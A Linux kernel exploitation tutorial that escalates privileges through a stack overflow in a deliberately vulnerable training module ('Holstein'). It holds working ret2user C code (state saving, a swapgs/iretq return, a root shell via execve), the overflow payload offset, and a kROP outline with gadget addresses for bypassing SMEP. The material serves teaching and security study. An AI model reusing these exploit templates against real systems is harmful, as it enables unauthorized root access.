---
title: "Holstein v1: Exploiting Stack Overflow"
tags:
    - [Linux]
    - [Kernel]
    - [Stack Overflow]
    - [ret2user, ret2usr]
    - [kROP]
    - [SMAP]
    - [SMEP]
    - [KPTI]
    - [KASLR]
lang: en
permalink: /en/linux-kernel/LK01/stack_overflow.html
pagination: true
bk: welcome-to-holstein.html
fd: heap_overflow.html
---
In the previous section we found a stack overflow in the Holstein module and confirmed that the bug gives us control of RIP. In this section we turn that primitive into local privilege escalation and learn how to bypass several common kernel mitigations.

## How privilege escalation works
There are many ways to escalate privileges, but the most fundamental one is to use `commit_creds`. This is a very natural approach because it performs essentially the same action the kernel uses when creating a root-privileged task.

One more important goal, after getting root, is returning safely to userland. Right now we are exploiting a kernel module, so our execution context is the kernel. In the end we still need to return to user space and spawn a root shell without crashing.

First let's review the theory behind those two tasks.

### `prepare_kernel_cred` and `commit_creds`
Every process has credentials. In Linux these are stored in a heap-allocated structure called [`cred`](https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/cred.h#L110). Each task is represented by a [`task_struct`](https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/sched.h#L661), and that structure contains a pointer to its credentials.
```c
struct task_struct {
    ...
	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
    ...
}
```
One of the most important functions in kernel exploitation is [`prepare_kernel_cred`](https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L719), which allocates and initializes a new credential structure. Let's look at the relevant part.
```c
/* Takes a pointer to task_struct as its argument */
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_kernel_cred() alloc %p", new);

	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);

    ...

    return new;
}
```
Let's trace the behavior of `prepare_kernel_cred(NULL)`. First, it allocates a fresh credential object:
```c
new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
```
Then, because the first argument `daemon` is `NULL`, it copies from `init_cred`:
```c
old = get_cred(&init_cred);
```
After validating `old`, the function copies the relevant members from `old` into `new`.

So `prepare_kernel_cred(NULL)` gives us a credential structure based on `init_cred`. Now look at the definition of [`init_cred`](https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L41):
```c
/*
 * The initial credentials for the initial task
 */
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
	.suid			= GLOBAL_ROOT_UID,
	.sgid			= GLOBAL_ROOT_GID,
	.euid			= GLOBAL_ROOT_UID,
	.egid			= GLOBAL_ROOT_GID,
	.fsuid			= GLOBAL_ROOT_UID,
	.fsgid			= GLOBAL_ROOT_GID,
	.securebits		= SECUREBITS_DEFAULT,
	.cap_inheritable	= CAP_EMPTY_SET,
	.cap_permitted		= CAP_FULL_SET,
	.cap_effective		= CAP_FULL_SET,
	.cap_bset		= CAP_FULL_SET,
	.user			= INIT_USER,
	.user_ns		= &init_user_ns,
	.group_info		= &init_groups,
	.ucounts		= &init_ucounts,
};
```
As you can see, `init_cred` is essentially a root credential object.

So now we can create a root credential. The next step is to install it into the current process. That is what [`commit_creds`](https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L449) does:
```c
int commit_creds(struct cred *new)
```
Therefore, a classic privilege-escalation primitive is:
```c
commit_creds(prepare_kernel_cred(NULL));
```

**[Update: March 28, 2023]**  
Starting from Linux 6.2, [`prepare_kernel_cred` no longer accepts `NULL`](https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c#L712). `init_cred` still exists, so `commit_creds(&init_cred)` achieves the same result.

### `swapgs`: returning to userland
Calling `prepare_kernel_cred` and `commit_creds` gives us root, but that is not the end. Once the ROP chain finishes, we must return to user space cleanly and spawn a shell. If we crash or terminate immediately after gaining root, the exploit is not useful.

ROP works by smashing the saved stack frames and replacing them with a chain, so restoring the original execution flow sounds difficult. But in kernel exploitation the vulnerable process is our own program, so after finishing the chain we can simply restore a valid user-space stack pointer and jump to a user-space function that spawns a shell.

How does the CPU move from user mode into kernel mode in the first place? Normally through a `syscall` or an interrupt. To return from kernel mode to user mode, the kernel typically uses `sysretq` or `iretq`. `iretq` is conceptually simpler, so kernel exploits usually use it. Also, before returning to user mode, we need to switch the GS segment from the kernel GS to the user GS, which is why Intel provides the `swapgs` instruction.

In practice, we want to execute `swapgs` followed by `iretq`. Before calling `iretq`, we must prepare the userland return state on the stack like this:

<center>
  <img src="img/iretq.png" alt="Stack layout for iretq" style="width:340px;">
</center>

Besides the user-space `RSP` and `RIP`, we must also restore `CS`, `SS`, and `RFLAGS`. The target `RSP` can point anywhere valid in userland, and `RIP` can point to a shell-spawning function. The remaining registers can be taken from the original user context, so it is convenient to save them ahead of time with a helper like this:
```c
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}
```
Call this while still in userland, such as at the start of `main`, and then use those saved values when you eventually execute `iretq`.

## ret2user (ret2usr)
Now let's put the theory into practice.

The most basic technique is ret2user. Because SMEP is disabled at this stage, the kernel can execute code that lives in userland memory. That means we can simply write the sequence involving `prepare_kernel_cred`, `commit_creds`, `swapgs`, and `iretq` directly in C code.
```c
static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

static void escalate_privilege() {
  char* (*pkc)(int) = (void*)(prepare_kernel_cred);
  void (*cc)(char*) = (void*)(commit_creds);
  (*cc)((*pkc)(0));
  restore_state();
}
```
These helper routines appear in many basic kernel exploits, so it is worth turning them into your own personal template. Also remember to call `save_state()` before triggering the bug.

Inside `escalate_privilege` we need function pointers for `prepare_kernel_cred` and `commit_creds`. KASLR is disabled in this stage, so those addresses should be fixed. Find them and hardcode them into your exploit.

<center>
  <img src="img/check_kallsyms.png" alt="Getting addresses from /proc/kallsyms" style="width:380px;">
</center>

At that point all that remains is to redirect control flow to `escalate_privilege`. You could spray the pointer many times, but since we will later do ROP anyway, it is useful to determine the exact saved RIP offset. You can compute it statically in IDA, but let's use gdb and observe the crash site directly.

Looking at the place where `module_write` calls `_copy_from_user`, the relevant offset inside the module is `0x190`. Add the module base from `/proc/modules`, set a breakpoint there, and trigger a write. The destination buffer around `RDI + 0x400` looks like this:

<center>
  <img src="img/gdb_debug_copy.png" alt="Destination buffer during _copy_from_user" style="width:580px;">
</center>

If we continue until just before the function returns, we get:

<center>
  <img src="img/gdb_debug_ret.png" alt="State at the end of module_write" style="width:580px;">
</center>

At that point `RSP` points to `0xffffc90000413eb0`.

<center>
  <img src="img/gdb_debug_ret_regs.png" alt="Registers at the end of module_write" style="width:480px;">
</center>

So it looks like RIP becomes controllable after `0x408` bytes of filler. With that in mind, we can update the exploit like this:
```c
  char buf[0x410];
  memset(buf, 'A', 0x410);
  *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
  write(fd, buf, 0x410);
```
The full exploit is available [here](exploit/ret2usr.c).

If you stop right before the `ret` at the end of `module_write`, you can confirm that execution reaches `escalate_privilege`.

<center>
  <img src="img/gdb_escalate_privilege.png" alt="Calling escalate_privilege via RIP control" style="width:520px;">
</center>

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="Wolf" ></div>
  <p class="says">
    Sometimes `nexti` does not stop at the next instruction as you expect.<br>
    In that case, try `stepi`, or place a breakpoint slightly further ahead.
  </p>
</div>

If the exploit is written correctly, execution will pass through `prepare_kernel_cred` and `commit_creds`. Step into `restore_state` as well. Right before `iretq`, the stack should look like this:

<center>
  <img src="img/gdb_rsp_before_iretq.png" alt="Stack state right before iretq" style="width:580px;">
</center>

If `stepi` lands in `win`, the exploit has worked.

<center>
  <img src="img/ret2usr_win.png" alt="Successfully calling win" style="width:320px;">
</center>

Right now the shell may already be running as root, so it can be hard to tell if the escalation actually mattered. But at least we confirmed a clean return to userland. Restore the original configuration in `S99pawnyable`, run the exploit as an unprivileged user, and check again.

<center>
  <img src="img/ret2usr_lpe.png" alt="LPE using ret2usr" style="width:400px;">
</center>

Privilege escalation succeeded.
This chapter introduced a lot of new ideas, so it may feel heavy at first. But as you keep working through heap and race bugs, you will notice that the final privilege-escalation steps are often very similar.

## kROP
Now enable SMEP. Add `smep` to the QEMU CPU options:
```
-cpu kvm64,+smep
```
Run the ret2user exploit again in that configuration.

<center>
  <img src="img/smep_crash.png" alt="Crash when SMEP is enabled" style="width:640px;">
</center>

It crashes. The message says `unable to execute userspace code (SMEP?)`, which tells us the kernel can no longer execute userland code because of SMEP.

This is very similar to NX/DEP in userland. The kernel may still read and write userland memory, but it can no longer execute it. So just as NX is bypassed with ROP, SMEP can be bypassed with ROP too. Kernel ROP is often called kROP.

If you are already familiar with userland exploitation, translating the ret2user logic into a ROP chain should not be difficult. There is nothing especially unusual about writing the chain itself, but let's at least walk through how to find the gadgets.

First, to search for ROP gadgets in the Linux kernel, you need to extract the core ELF image `vmlinux` from `bzImage`. The kernel tree provides the official [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) script for this purpose.
```
$ extract-vmlinux bzImage > vmlinux
```
Then use your preferred gadget finder.
```
$ ropr vmlinux --noisy --nosys --nojop -R '^pop rdi.+ret;'
...
0xffffffff8127bbdc: pop rdi; ret;
...
```
The addresses printed there are absolute addresses. They are computed as the kernel base when KASLR is disabled (`0xffffffff81000000`) plus a relative offset. In the example above the relative offset is `0x27bbdc`. Since KASLR is disabled here, you can use the printed addresses directly. When KASLR is enabled, you must work with relative offsets instead.

The Linux kernel contains a huge amount of code compared to libc, so in practice there are usually enough gadgets to express arbitrary behavior. In this example the author used the following gadgets, but you should try building your own chain as a debugging exercise.
```
0xffffffff8127bbdc: pop rdi; ret;
0xffffffff81c9480d: pop rcx; ret;
0xffffffff8160c96b: mov rdi, rax; rep movsq [rdi], [rsi]; ret;
0xffffffff8160bf7e: swapgs; ret;
```
Finally, you still need `iretq`, but most standard gadget tools do not find it, so search with `objdump` or a similar tool:
```
$ objdump -S -M intel vmlinux | grep iretq
ffffffff810202af:       48 cf                   iretq
...
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
  <p class="says">
    Most ROP gadget tools are not well tested on huge binaries like the kernel.<br>
    They may skip unsupported instructions, drop prefixes, or otherwise print incorrect results.<br>
    Also, many tools do not correctly distinguish whether a gadget lives in executable kernel memory, so be especially careful with very high addresses such as <code>0xffffffff81cXXXYYY</code>.
  </p>
</div>

The exact ROP style is up to you, but the author likes to write it this way because offsets do not need to be recomputed whenever gadgets are inserted or removed:
```c
unsigned long *chain = (unsigned long*)&buf[0x408];
*chain++ = rop_pop_rdi;
*chain++ = 0;
```

The rest of the chain follows the same idea:
- call `prepare_kernel_cred(0)`
- move the returned pointer into `rdi`
- call `commit_creds`
- execute `swapgs`
- return to userland with `iretq`

Once you are comfortable with this version, continue to the next chapter where the stack overflow disappears and heap-based bugs take over.
